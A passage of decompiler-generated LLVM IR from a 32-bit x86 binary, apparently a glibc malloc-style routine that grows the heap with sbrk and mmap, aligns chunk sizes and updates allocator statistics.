  br i1 %v10_804c1bb, label %dec_label_pc_804c1a4.dec_label_pc_804c235_crit_edge, label %dec_label_pc_804c1c0

dec_label_pc_804c1a4.dec_label_pc_804c235_crit_edge: ; preds = %dec_label_pc_804c1a4
  %v0_804c235.pre = load i32, i32* @global_var_8056a6c.343, align 4
  br label %dec_label_pc_804c235

dec_label_pc_804c1c0:                             ; preds = %dec_label_pc_804c1a4
  %v1_804c1c2 = urem i32 %v8_804c1b1, 8
  %v2_804c1c2 = icmp eq i32 %v1_804c1c2, 0
  store i32 %v1_804c1c2, i32* @ecx, align 4
  br i1 %v2_804c1c2, label %dec_label_pc_804c1da, label %dec_label_pc_804c1c7

dec_label_pc_804c1c7:                             ; preds = %dec_label_pc_804c1c0
  %v0_804c1cc = load i32, i32* @ebx, align 4
  %v2_804c1ce = sub nsw i32 8, %v1_804c1c2
  store i32 %v2_804c1ce, i32* %eax.global-to-local, align 4
  %v2_804c1d0 = add i32 %v2_804c1ce, %v8_804c1b1
  store i32 %v2_804c1d0, i32* @edx, align 4
  %v2_804c1d2 = sub i32 %v0_804c1cc, %v2_804c1ce
  store i32 %v2_804c1d2, i32* %esi.global-to-local, align 4
  %v2_804c1d4 = inttoptr i32 %v2_804c1d0 to i32*
  store i32 %v2_804c1ce, i32* %v2_804c1d4, align 4
  br label %dec_label_pc_804c1e2

dec_label_pc_804c1da:                             ; preds = %dec_label_pc_804c1c0
  %v1_804c1da = inttoptr i32 %v8_804c1b1 to i32*
  store i32 0, i32* %v1_804c1da, align 4
  br label %dec_label_pc_804c1e2

dec_label_pc_804c1e2:                             ; preds = %dec_label_pc_804c1c7, %dec_label_pc_804c1da
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_804c1c7 ], [ @ebx, %dec_label_pc_804c1da ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_804c1e2 = or i32 %storemerge, 2
  %v1_804c1e5 = load i32, i32* @edx, align 4
  %v2_804c1e5 = add i32 %v1_804c1e5, 4
  %v3_804c1e5 = inttoptr i32 %v2_804c1e5 to i32*
  store i32 %v1_804c1e2, i32* %v3_804c1e5, align 4
  %v0_804c1e8 = load i32, i32* @global_var_8056d90.350, align 16
  %v1_804c1ed = add i32 %v0_804c1e8, 1
  store i32 %v1_804c1ed, i32* %eax.global-to-local, align 4
  store i32 %v1_804c1ed, i32* @global_var_8056d90.350, align 16
  %v1_804c1f3 = load i32, i32* @global_var_8056d98.352, align 8
  %v7_804c1f9 = icmp sgt i32 %v1_804c1ed, %v1_804c1f3
  br i1 %v7_804c1f9, label %dec_label_pc_804c1fb, label %dec_label_pc_804c200

dec_label_pc_804c1fb:                             ; preds = %dec_label_pc_804c1e2
  store i32 %v1_804c1ed, i32* @global_var_8056d98.352, align 8
  br label %dec_label_pc_804c200

dec_label_pc_804c200:                             ; preds = %dec_label_pc_804c1e2, %dec_label_pc_804c1fb
  %v0_804c200 = load i32, i32* @global_var_8056da4.353, align 4
  %v1_804c205 = load i32, i32* @ebx, align 4
  %v2_804c205 = add i32 %v1_804c205, %v0_804c200
  store i32 %v2_804c205, i32* %eax.global-to-local, align 4
  store i32 %v2_804c205, i32* @global_var_8056da4.353, align 4
  %v1_804c20c = load i32, i32* @global_var_8056db0.354, align 16
  %tmp130 = icmp ugt i32 %v2_804c205, %v1_804c20c
  br i1 %tmp130, label %dec_label_pc_804c214, label %dec_label_pc_804c219

dec_label_pc_804c214:                             ; preds = %dec_label_pc_804c200
  store i32 %v2_804c205, i32* @global_var_8056db0.354, align 16
  br label %dec_label_pc_804c219

dec_label_pc_804c219:                             ; preds = %dec_label_pc_804c200, %dec_label_pc_804c214
  %v1_804c219 = load i32, i32* @global_var_8056da8.355, align 8
  %v2_804c219 = add i32 %v1_804c219, %v2_804c205
  store i32 %v2_804c219, i32* %eax.global-to-local, align 4
  %v1_804c21f = load i32, i32* @global_var_8056db4.356, align 4
  %tmp131 = icmp ugt i32 %v2_804c219, %v1_804c21f
  br i1 %tmp131, label %dec_label_pc_804c22b, label %dec_label_pc_804be7c

dec_label_pc_804c22b:                             ; preds = %dec_label_pc_804c219
  store i32 %v2_804c219, i32* @global_var_8056db4.356, align 4
  br label %dec_label_pc_804be7c

dec_label_pc_804c235:                             ; preds = %dec_label_pc_804c190, %dec_label_pc_804c1a4.dec_label_pc_804c235_crit_edge, %dec_label_pc_804c17f, %dec_label_pc_804c168
  %v0_804c235 = phi i32 [ %v0_804c235.pre, %dec_label_pc_804c1a4.dec_label_pc_804c235_crit_edge ], [ %v0_804c0fd, %dec_label_pc_804c17f ], [ %v0_804c0fd, %dec_label_pc_804c190 ], [ %v0_804c0fd, %dec_label_pc_804c168 ]
  store i32 %v0_804c235, i32* %eax.global-to-local, align 4
  %v1_804c23e = add i32 %v0_804c235, 4
  %v2_804c23e = inttoptr i32 %v1_804c23e to i32*
  %v3_804c23e = load i32, i32* %v2_804c23e, align 4
  %v1_804c248 = and i32 %v3_804c23e, -4
  %v2_804c248 = icmp eq i32 %v1_804c248, 0
  store i32 %v1_804c248, i32* @ebp, align 4
  %v1_804c24b = load i32, i32* @global_var_8056d88.357, align 8
  %v2_804c24b = add i32 %v1_804c24b, %v1_804c107
  store i32 %v2_804c24b, i32* %eax.global-to-local, align 4
  %v0_804c251 = load i8, i8* @global_var_8056da0.358, align 32
  %v1_804c251 = urem i8 %v0_804c251, 2
  %v2_804c251 = icmp eq i8 %v1_804c251, 0
  br i1 %v2_804c251, label %dec_label_pc_804c25c, label %dec_label_pc_804c25a

dec_label_pc_804c25a:                             ; preds = %dec_label_pc_804c235
  %v2_804c25a = sub i32 %v2_804c24b, %v1_804c248
  store i32 %v2_804c25a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c25c

dec_label_pc_804c25c:                             ; preds = %dec_label_pc_804c235, %dec_label_pc_804c25a
  %v0_804c260 = phi i32 [ %v2_804c24b, %dec_label_pc_804c235 ], [ %v2_804c25a, %dec_label_pc_804c25a ]
  %v5_804c260 = add i32 %v0_804c260, %v1_804c168
  store i32 %v5_804c260, i32* %eax.global-to-local, align 4
  %v1_804c264 = sub i32 0, %v0_804c134
  store i32 %v1_804c264, i32* @edx, align 4
  %v2_804c26c = and i32 %v5_804c260, %v1_804c264
  store i32 %v2_804c26c, i32* @esi, align 4
  %tmp88 = icmp slt i32 %v2_804c26c, 1
  br i1 %tmp88, label %dec_label_pc_804c286, label %dec_label_pc_804c270

dec_label_pc_804c270:                             ; preds = %dec_label_pc_804c25c
  store i32 %v2_804c26c, i32* %stack_var_-92, align 4
  %v1_804c274 = call i32 @__GI_sbrk(i32 %v2_804c26c)
  store i32 %v1_804c274, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_804c274, i32* @ebx, align 4
  %v10_804c281 = icmp eq i32 %v1_804c274, -1
  %v1_804c284 = icmp eq i1 %v10_804c281, false
  br i1 %v1_804c284, label %dec_label_pc_804c2dc.dec_label_pc_804c2e5_crit_edge, label %dec_label_pc_804c270.dec_label_pc_804c286_crit_edge

dec_label_pc_804c270.dec_label_pc_804c286_crit_edge: ; preds = %dec_label_pc_804c270
  %v0_804c286.pre = load i8, i8* @global_var_8056da0.358, align 32
  br label %dec_label_pc_804c286

dec_label_pc_804c286:                             ; preds = %dec_label_pc_804c270.dec_label_pc_804c286_crit_edge, %dec_label_pc_804c25c
  %v0_804c2b2 = phi i32 [ -1, %dec_label_pc_804c270.dec_label_pc_804c286_crit_edge ], [ %v1_804c264, %dec_label_pc_804c25c ]
  %v0_804c286 = phi i8 [ %v0_804c286.pre, %dec_label_pc_804c270.dec_label_pc_804c286_crit_edge ], [ %v0_804c251, %dec_label_pc_804c25c ]
  %v1_804c286 = urem i8 %v0_804c286, 2
  %v2_804c286 = icmp eq i8 %v1_804c286, 0
  br i1 %v2_804c286, label %dec_label_pc_804c286.dec_label_pc_804c29b_crit_edge, label %dec_label_pc_804c28f

dec_label_pc_804c286.dec_label_pc_804c29b_crit_edge: ; preds = %dec_label_pc_804c286
  %v0_804c29b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c29b

dec_label_pc_804c28f:                             ; preds = %dec_label_pc_804c286
  %v2_804c293 = add i32 %v1_804c248, %v1_804c168
  store i32 %v2_804c293, i32* %eax.global-to-local, align 4
  %v0_804c295 = load i32, i32* @esi, align 4
  %v2_804c295 = add i32 %v0_804c295, %v2_804c293
  %v5_804c297 = and i32 %v2_804c295, %v1_804c264
  store i32 %v5_804c297, i32* @esi, align 4
  br label %dec_label_pc_804c29b

dec_label_pc_804c29b:                             ; preds = %dec_label_pc_804c286.dec_label_pc_804c29b_crit_edge, %dec_label_pc_804c28f
  %v0_804c29b = phi i32 [ %v0_804c29b.pre, %dec_label_pc_804c286.dec_label_pc_804c29b_crit_edge ], [ %v5_804c297, %dec_label_pc_804c28f ]
  %tmp132 = icmp ult i32 %v0_804c29b, 1048576
  br i1 %tmp132, label %dec_label_pc_804c2a3, label %dec_label_pc_804c2a8

dec_label_pc_804c2a3:                             ; preds = %dec_label_pc_804c29b
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_804c2a8

dec_label_pc_804c2a8:                             ; preds = %dec_label_pc_804c29b, %dec_label_pc_804c2a3
  %v0_804c2bc = phi i32 [ %v0_804c29b, %dec_label_pc_804c29b ], [ 1048576, %dec_label_pc_804c2a3 ]
  %tmp133 = icmp ugt i32 %v0_804c2bc, %v1_804c192
  br i1 %tmp133, label %dec_label_pc_804c2b2, label %dec_label_pc_804c4ea

dec_label_pc_804c2b2:                             ; preds = %dec_label_pc_804c2a8
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804c2bf = call i32 @mmap(i32 0, i32 %v0_804c2bc, i32 3, i32 34, i32 0, i32 0, i32 %v0_804c2b2, i32 %v0_804c2b2)
  store i32 %v8_804c2bf, i32* %eax.global-to-local, align 4
  store i32 %v8_804c2bf, i32* @ebx, align 4
  %v10_804c2c9 = icmp eq i32 %v8_804c2bf, -1
  br i1 %v10_804c2c9, label %dec_label_pc_804c4ea, label %dec_label_pc_804c2dc.thread

dec_label_pc_804c2dc.thread:                      ; preds = %dec_label_pc_804c2b2
  %v0_804c2d2 = load i8, i8* @global_var_8056da0.358, align 1
  %v2_804c2d2 = and i8 %v0_804c2d2, -2
  store i8 %v2_804c2d2, i8* @global_var_8056da0.358, align 32
  %v1_804c2d9 = load i32, i32* @esi, align 4
  %v2_804c2d9 = add i32 %v1_804c2d9, %v8_804c2bf
  store i32 %v2_804c2d9, i32* @edx, align 4
  br label %dec_label_pc_804c2e5

dec_label_pc_804c2dc.dec_label_pc_804c2e5_crit_edge: ; preds = %dec_label_pc_804c270
  %v1_804c2e9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c2e5

dec_label_pc_804c2e5:                             ; preds = %dec_label_pc_804c2dc.dec_label_pc_804c2e5_crit_edge, %dec_label_pc_804c2dc.thread
  %v1_804c2e9 = phi i32 [ %v1_804c2d9, %dec_label_pc_804c2dc.thread ], [ %v1_804c2e9.pre, %dec_label_pc_804c2dc.dec_label_pc_804c2e5_crit_edge ]
  %v0_804c3b192 = phi i32 [ %v8_804c2bf, %dec_label_pc_804c2dc.thread ], [ %v1_804c274, %dec_label_pc_804c2dc.dec_label_pc_804c2e5_crit_edge ]
  %v0_804c3a391 = phi i32 [ %v2_804c2d9, %dec_label_pc_804c2dc.thread ], [ -1, %dec_label_pc_804c2dc.dec_label_pc_804c2e5_crit_edge ]
  %v0_804c2e9 = load i32, i32* @global_var_8056da8.355, align 8
  %v2_804c2e9 = add i32 %v1_804c2e9, %v0_804c2e9
  store i32 %v2_804c2e9, i32* @global_var_8056da8.355, align 8
  %v2_804c2ef = add i32 %v1_804c248, %v0_804c235
  store i32 %v2_804c2ef, i32* %ecx.global-to-local, align 4
  %v2_804c2f1 = sub i32 %v0_804c3b192, %v2_804c2ef
  %v7_804c2f1 = icmp ult i32 %v0_804c3b192, %v2_804c2ef
  %v12_804c2f1 = icmp eq i32 %v2_804c2f1, 0
  %v1_804c2f3 = icmp eq i1 %v12_804c2f1, false
  br i1 %v1_804c2f3, label %dec_label_pc_804c30c, label %dec_label_pc_804c2f5

dec_label_pc_804c2f5:                             ; preds = %dec_label_pc_804c2e5
  %v10_804c2f5 = icmp eq i32 %v0_804c3a391, -1
  %v1_804c2f8 = icmp eq i1 %v10_804c2f5, false
  br i1 %v1_804c2f8, label %dec_label_pc_804c30c, label %dec_label_pc_804c2fa

dec_label_pc_804c2fa:                             ; preds = %dec_label_pc_804c2f5
  %v2_804c2fa = add i32 %v1_804c2e9, %v1_804c248
  store i32 %v0_804c235, i32* %ecx.global-to-local, align 4
  %v1_804c301 = or i32 %v2_804c2fa, 1
  store i32 %v1_804c301, i32* %eax.global-to-local, align 4
  store i32 %v1_804c301, i32* %v2_804c23e, align 4
  br label %dec_label_pc_804c439

dec_label_pc_804c30c:                             ; preds = %dec_label_pc_804c2f5, %dec_label_pc_804c2e5
  %v0_804c30c = load i8, i8* @global_var_8056da0.358, align 1
  %v1_804c30c = sext i8 %v0_804c30c to i32
  store i32 %v1_804c30c, i32* %eax.global-to-local, align 4
  %v2_804c311 = urem i8 %v0_804c30c, 2
  %v3_804c311 = icmp eq i8 %v2_804c311, 0
  br i1 %v3_804c311, label %dec_label_pc_804c325, label %dec_label_pc_804c315

dec_label_pc_804c315:                             ; preds = %dec_label_pc_804c30c
  br i1 %v2_804c248, label %dec_label_pc_804c325, label %dec_label_pc_804c319

dec_label_pc_804c319:                             ; preds = %dec_label_pc_804c315
  %v1_804c31b = icmp eq i1 %v7_804c2f1, false
  br i1 %v1_804c31b, label %dec_label_pc_804c325, label %dec_label_pc_804c31d

dec_label_pc_804c31d:                             ; preds = %dec_label_pc_804c319
  %v1_804c31d = and i32 %v1_804c30c, -2
  %v4_804c31d = trunc i32 %v1_804c31d to i8
  store i32 %v1_804c31d, i32* %eax.global-to-local, align 4
  store i8 %v4_804c31d, i8* @global_var_8056da0.358, align 32
  br label %dec_label_pc_804c325

dec_label_pc_804c325:                             ; preds = %dec_label_pc_804c319, %dec_label_pc_804c315, %dec_label_pc_804c30c, %dec_label_pc_804c31d
  %v0_804c325 = phi i8 [ %v0_804c30c, %dec_label_pc_804c319 ], [ %v0_804c30c, %dec_label_pc_804c315 ], [ %v0_804c30c, %dec_label_pc_804c30c ], [ %v4_804c31d, %dec_label_pc_804c31d ]
  %v1_804c325 = urem i8 %v0_804c325, 2
  %v2_804c325 = icmp eq i8 %v1_804c325, 0
  br i1 %v2_804c325, label %dec_label_pc_804c3a3, label %dec_label_pc_804c32e

dec_label_pc_804c32e:                             ; preds = %dec_label_pc_804c325
  br i1 %v2_804c248, label %dec_label_pc_804c33c, label %dec_label_pc_804c332

dec_label_pc_804c332:                             ; preds = %dec_label_pc_804c32e
  store i32 %v2_804c2f1, i32* %eax.global-to-local, align 4
  %v2_804c336 = add i32 %v2_804c2e9, %v2_804c2f1
  store i32 %v2_804c336, i32* @global_var_8056da8.355, align 8
  br label %dec_label_pc_804c33c

dec_label_pc_804c33c:                             ; preds = %dec_label_pc_804c32e, %dec_label_pc_804c332
  %v1_804c33e = urem i32 %v0_804c3b192, 8
  %v2_804c33e = icmp eq i32 %v1_804c33e, 0
  store i32 %v1_804c33e, i32* %edx.global-to-local, align 4
  %v1_804c341 = icmp eq i1 %v2_804c33e, false
  br i1 %v1_804c341, label %dec_label_pc_804c349, label %dec_label_pc_804c343

dec_label_pc_804c343:                             ; preds = %dec_label_pc_804c33c
  store i32 %v0_804c3b192, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c353

dec_label_pc_804c349:                             ; preds = %dec_label_pc_804c33c
  %v2_804c34e = sub nsw i32 8, %v1_804c33e
  store i32 %v2_804c34e, i32* %eax.global-to-local, align 4
  %v2_804c350 = add i32 %v2_804c34e, %v0_804c3b192
  store i32 %v2_804c350, i32* @edi, align 4
  br label %dec_label_pc_804c353

dec_label_pc_804c353:                             ; preds = %dec_label_pc_804c343, %dec_label_pc_804c349
  %v0_804c356 = phi i32 [ 0, %dec_label_pc_804c343 ], [ %v2_804c34e, %dec_label_pc_804c349 ]
  %v2_804c353 = add i32 %v1_804c2e9, %v0_804c3b192
  %v2_804c356 = add i32 %v0_804c356, %v1_804c248
  store i32 %v2_804c356, i32* %ecx.global-to-local, align 4
  %v2_804c35f = add i32 %v2_804c356, %v2_804c353
  store i32 %v2_804c35f, i32* %edx.global-to-local, align 4
  %v2_804c365 = add i32 %v2_804c35f, %v1_804c168
  %v5_804c368 = and i32 %v2_804c365, %v1_804c264
  %v2_804c36f = sub i32 %v5_804c368, %v2_804c35f
  store i32 %v2_804c36f, i32* %eax.global-to-local, align 4
  %v2_804c371 = add i32 %v2_804c36f, %v2_804c356
  store i32 %v2_804c371, i32* @esi, align 4
  store i32 %v2_804c371, i32* %stack_var_-92, align 4
  %v1_804c375 = call i32 @__GI_sbrk(i32 %v2_804c371)
  store i32 %v1_804c375, i32* %eax.global-to-local, align 4
  store i32 %v1_804c375, i32* @edx, align 4
  %v10_804c37f = icmp eq i32 %v1_804c375, -1
  %v1_804c382 = icmp eq i1 %v10_804c37f, false
  br i1 %v1_804c382, label %dec_label_pc_804c392, label %dec_label_pc_804c384

dec_label_pc_804c384:                             ; preds = %dec_label_pc_804c353
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804c389 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804c389, i32* %eax.global-to-local, align 4
  store i32 %v1_804c389, i32* @edx, align 4
  br label %dec_label_pc_804c3c6

dec_label_pc_804c392:                             ; preds = %dec_label_pc_804c353
  %v1_804c392 = load i32, i32* @ebx, align 4
  %v7_804c392 = icmp ult i32 %v1_804c375, %v1_804c392
  %v1_804c394 = icmp eq i1 %v7_804c392, false
  br i1 %v1_804c394, label %dec_label_pc_804c3cb, label %dec_label_pc_804c396

dec_label_pc_804c396:                             ; preds = %dec_label_pc_804c392
  %v0_804c396 = load i8, i8* @global_var_8056da0.358, align 1
  %v2_804c396 = and i8 %v0_804c396, -2
  store i8 %v2_804c396, i8* @global_var_8056da0.358, align 32
  store i32 %v2_804c353, i32* @edx, align 4
  br label %dec_label_pc_804c3aa

dec_label_pc_804c3a3:                             ; preds = %dec_label_pc_804c325
  %v10_804c3a3 = icmp eq i32 %v0_804c3a391, -1
  br i1 %v10_804c3a3, label %dec_label_pc_804c3ae, label %dec_label_pc_804c3a8

dec_label_pc_804c3a8:                             ; preds = %dec_label_pc_804c3a3
  store i32 %v0_804c3b192, i32* @edi, align 4
  br label %dec_label_pc_804c3aa

dec_label_pc_804c3aa:                             ; preds = %dec_label_pc_804c396, %dec_label_pc_804c3a8
  %v0_804c3cb49 = phi i32 [ %v2_804c353, %dec_label_pc_804c396 ], [ %v0_804c3a391, %dec_label_pc_804c3a8 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804c3cb

dec_label_pc_804c3ae:                             ; preds = %dec_label_pc_804c3a3
  store i32 %v0_804c3b192, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804c3b5 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804c3b5, i32* @edx, align 4
  %v1_804c3bc = load i32, i32* @ebx, align 4
  %v2_804c3bc = sub i32 %v1_804c3b5, %v1_804c3bc
  %v1_804c3be = load i32, i32* @esi, align 4
  %v2_804c3be = sub i32 %v2_804c3bc, %v1_804c3be
  store i32 %v2_804c3be, i32* %eax.global-to-local, align 4
  %v0_804c3c0 = load i32, i32* @global_var_8056da8.355, align 8
  %v2_804c3c0 = add i32 %v0_804c3c0, %v2_804c3be
  store i32 %v2_804c3c0, i32* @global_var_8056da8.355, align 8
  br label %dec_label_pc_804c3c6

dec_label_pc_804c3c6:                             ; preds = %dec_label_pc_804c384, %dec_label_pc_804c3ae
  %v0_804c3cb48 = phi i32 [ %v1_804c389, %dec_label_pc_804c384 ], [ %v1_804c3b5, %dec_label_pc_804c3ae ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804c3cb

dec_label_pc_804c3cb:                             ; preds = %dec_label_pc_804c392, %dec_label_pc_804c3aa, %dec_label_pc_804c3c6
  %v0_804c3d0 = phi i32 [ %v1_804c375, %dec_label_pc_804c392 ], [ %v0_804c3cb49, %dec_label_pc_804c3aa ], [ %v0_804c3cb48, %dec_label_pc_804c3c6 ]
  %v10_804c3cb = icmp eq i32 %v0_804c3d0, -1
  br i1 %v10_804c3cb, label %dec_label_pc_804c439, label %dec_label_pc_804c3d0

dec_label_pc_804c3d0:                             ; preds = %dec_label_pc_804c3cb
  %v1_804c3d0 = load i32, i32* @edi, align 4
  %v2_804c3d0 = sub i32 %v0_804c3d0, %v1_804c3d0
  store i32 %v2_804c3d0, i32* @edx, align 4
  store i32 %v1_804c3d0, i32* @global_var_8056a6c.343, align 4
  %v1_804c3d8 = load i32, i32* @esi, align 4
  %v2_804c3d8 = add i32 %v1_804c3d8, %v2_804c3d0
  %v1_804c3db = or i32 %v2_804c3d8, 1
  store i32 %v1_804c3db, i32* %eax.global-to-local, align 4
  %v2_804c3de = add i32 %v1_804c3d0, 4
  %v3_804c3de = inttoptr i32 %v2_804c3de to i32*
  store i32 %v1_804c3db, i32* %v3_804c3de, align 4
  %v0_804c3e1 = load i32, i32* @global_var_8056da8.355, align 8
  %v1_804c3e1 = load i32, i32* @esi, align 4
  %v2_804c3e1 = add i32 %v1_804c3e1, %v0_804c3e1
  store i32 %v2_804c3e1, i32* @global_var_8056da8.355, align 8
  br i1 %v2_804c248, label %dec_label_pc_804c439, label %dec_label_pc_804c3eb

dec_label_pc_804c3eb:                             ; preds = %dec_label_pc_804c3d0
  %v1_804c3eb = add i32 %v1_804c248, -12
  store i32 %v0_804c235, i32* %ecx.global-to-local, align 4
  %v1_804c3f2 = and i32 %v1_804c3eb, -8
  store i32 %v1_804c3f2, i32* %eax.global-to-local, align 4
  %v1_804c3f7 = or i32 %v1_804c3f2, 1
  store i32 %v1_804c3f7, i32* @edx, align 4
  %v5_804c3fa = icmp ult i32 %v1_804c3f2, 15
  store i32 %v1_804c3f7, i32* %v2_804c23e, align 4
  %v0_804c400 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804c400 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c400 = add i32 %v0_804c400, 4
  %v3_804c400 = add i32 %v2_804c400, %v1_804c400
  %v4_804c400 = inttoptr i32 %v3_804c400 to i32*
  store i32 5, i32* %v4_804c400, align 4
  %v0_804c408 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804c408 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c408 = add i32 %v0_804c408, 8
  %v3_804c408 = add i32 %v2_804c408, %v1_804c408
  %v4_804c408 = inttoptr i32 %v3_804c408 to i32*
  store i32 5, i32* %v4_804c408, align 4
  br i1 %v5_804c3fa, label %dec_label_pc_804c439, label %dec_label_pc_804c412

dec_label_pc_804c412:                             ; preds = %dec_label_pc_804c3eb
  %v0_804c415 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804c417 = add i32 %v0_804c415, 8
  store i32 %v1_804c417, i32* %eax.global-to-local, align 4
  %v0_804c41a = load i32, i32* @global_var_8056d84.359, align 4
  store i32 %v0_804c41a, i32* @ebx, align 4
  store i32 %v1_804c417, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8056d84.359, align 4
  %v1_804c42b = call i32 @free(i32 %v1_804c417)
  store i32 %v1_804c42b, i32* %eax.global-to-local, align 4
  %v0_804c430 = load i32, i32* @ebx, align 4
  store i32 %v0_804c430, i32* @global_var_8056d84.359, align 4
  br label %dec_label_pc_804c439

dec_label_pc_804c439:                             ; preds = %dec_label_pc_804c3eb, %dec_label_pc_804c3d0, %dec_label_pc_804c3cb, %dec_label_pc_804c2fa, %dec_label_pc_804c412
  %v0_804c439 = load i32, i32* @global_var_8056da8.355, align 8
  store i32 %v0_804c439, i32* %eax.global-to-local, align 4
  %v1_804c43e = load i32, i32* @global_var_8056dac.360, align 4
  %tmp134 = icmp ugt i32 %v0_804c439, %v1_804c43e
  br i1 %tmp134, label %dec_label_pc_804c446, label %dec_label_pc_804c44b

dec_label_pc_804c446:                             ; preds = %dec_label_pc_804c439
  store i32 %v0_804c439, i32* @global_var_8056dac.360, align 4
  br label %dec_label_pc_804c44b

dec_label_pc_804c44b:                             ; preds = %dec_label_pc_804c439, %dec_label_pc_804c446
  %v1_804c44b = load i32, i32* @global_var_8056da4.353, align 4
  %v2_804c44b = add i32 %v1_804c44b, %v0_804c439
  store i32 %v2_804c44b, i32* %eax.global-to-local, align 4
  %v1_804c451 = load i32, i32* @global_var_8056db4.356, align 4
  %tmp135 = icmp ugt i32 %v2_804c44b, %v1_804c451
  br i1 %tmp135, label %dec_label_pc_804c459, label %dec_label_pc_804c45e

dec_label_pc_804c459:                             ; preds = %dec_label_pc_804c44b
  store i32 %v2_804c44b, i32* @global_var_8056db4.356, align 4
  br label %dec_label_pc_804c45e

dec_label_pc_804c45e:                             ; preds = %dec_label_pc_804c44b, %dec_label_pc_804c459
  %v0_804c45e = load i32, i32* @global_var_8056a6c.343, align 4
  store i32 %v0_804c45e, i32* @ebx, align 4
  %v1_804c464 = add i32 %v0_804c45e, 4
  %v2_804c464 = inttoptr i32 %v1_804c464 to i32*
  %v3_804c464 = load i32, i32* %v2_804c464, align 4
  %v1_804c467 = and i32 %v3_804c464, -4
  store i32 %v1_804c467, i32* @ecx, align 4
  %v10_804c46a = icmp ult i32 %v1_804c467, %v1_804c107
  br i1 %v10_804c46a, label %dec_label_pc_804c4ea, label %dec_label_pc_804c470

dec_label_pc_804c470:                             ; preds = %dec_label_pc_804c45e
  store i32 %v1_804c192, i32* %esi.global-to-local, align 4
  %v2_804c476 = sub i32 %v1_804c467, %v1_804c192
  store i32 %v2_804c476, i32* %ecx.global-to-local, align 4
  %v2_804c478 = add i32 %v0_804c45e, %v1_804c192
  store i32 %v2_804c478, i32* @edx, align 4
  %v1_804c47b = or i32 %v1_804c192, 1
  store i32 %v1_804c47b, i32* %eax.global-to-local, align 4
  store i32 %v2_804c478, i32* @global_var_8056a6c.343, align 4
  store i32 %v1_804c47b, i32* %v2_804c464, align 4
  %v0_804c487.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804c487

dec_label_pc_804c487:                             ; preds = %dec_label_pc_804c118, %dec_label_pc_804c470
  %v0_804c487 = phi i32 [ %v5_804c12b, %dec_label_pc_804c118 ], [ %v0_804c487.pre, %dec_label_pc_804c470 ]
  %v1_804c487 = or i32 %v0_804c487, 1
  store i32 %v1_804c487, i32* @ecx, align 4
  %v0_804c48a = load i32, i32* @ebx, align 4
  %v1_804c48a = add i32 %v0_804c48a, 8
  store i32 %v1_804c48a, i32* %ebx.global-to-local, align 4
  %v1_804c48d = load i32, i32* @edx, align 4
  %v2_804c48d = add i32 %v1_804c48d, 4
  %v3_804c48d = inttoptr i32 %v2_804c48d to i32*
  store i32 %v1_804c487, i32* %v3_804c48d, align 4
  br label %dec_label_pc_804c4f7

dec_label_pc_804c492:                             ; preds = %dec_label_pc_804bed2
  %v5_804c498 = sub i32 %v1_804beb5, %v1_804c192
  store i32 %v5_804c498, i32* %eax.global-to-local, align 4
  %v2_804c49c = add i32 %v0_804bf80111, %v1_804c192
  store i32 %v2_804c49c, i32* @edx, align 4
  %v1_804c4a0 = or i32 %v1_804c192, 1
  store i32 %v2_804c49c, i32* @global_var_8056a70.344, align 16
  store i32 %v1_804c4a0, i32* %v2_804beaf, align 4
  %v0_804c4ac = load i32, i32* %eax.global-to-local, align 4
  %v0_804c4ae = load i32, i32* @edx, align 4
  store i32 %v0_804c4ae, i32* @global_var_8056a7c.361, align 4
  %v1_804c4b4 = or i32 %v0_804c4ac, 1
  store i32 %v1_804c4b4, i32* @ecx, align 4
  store i32 %v0_804c4ae, i32* @global_var_8056a80.346, align 128
  %v1_804c4bd = add i32 %v0_804c4ae, 8
  %v2_804c4bd = inttoptr i32 %v1_804c4bd to i32*
  store i32 ptrtoint (i32* @global_var_8056a74.345 to i32), i32* %v2_804c4bd, align 4
  %v0_804c4c4 = load i32, i32* @edx, align 4
  %v1_804c4c4 = add i32 %v0_804c4c4, 12
  %v2_804c4c4 = inttoptr i32 %v1_804c4c4 to i32*
  store i32 ptrtoint (i32* @global_var_8056a74.345 to i32), i32* %v2_804c4c4, align 4
  %v0_804c4cb = load i32, i32* @ecx, align 4
  %v1_804c4cb = load i32, i32* @edx, align 4
  %v2_804c4cb = add i32 %v1_804c4cb, 4
  %v3_804c4cb = inttoptr i32 %v2_804c4cb to i32*
  store i32 %v0_804c4cb, i32* %v3_804c4cb, align 4
  %v0_804c4ce = load i32, i32* %eax.global-to-local, align 4
  %v1_804c4ce = load i32, i32* @edx, align 4
  %v3_804c4ce = add i32 %v1_804c4ce, %v0_804c4ce
  %v4_804c4ce = inttoptr i32 %v3_804c4ce to i32*
  store i32 %v0_804c4ce, i32* %v4_804c4ce, align 4
  br label %dec_label_pc_804c4dc

dec_label_pc_804c4d3:                             ; preds = %dec_label_pc_804bee1
  store i32 %v1_804c192, i32* %ebx.global-to-local, align 4
  %v0_804c4d7 = load i32, i32* @ebp, align 4
  %v2_804c4d7 = or i32 %v1_804c192, 4
  %v3_804c4d7 = add i32 %v0_804c4d7, %v2_804c4d7
  %v4_804c4d7 = inttoptr i32 %v3_804c4d7 to i32*
  %v5_804c4d7 = load i32, i32* %v4_804c4d7, align 4
  %v6_804c4d7 = or i32 %v5_804c4d7, 1
  store i32 %v6_804c4d7, i32* %v4_804c4d7, align 4
  br label %dec_label_pc_804c4dc

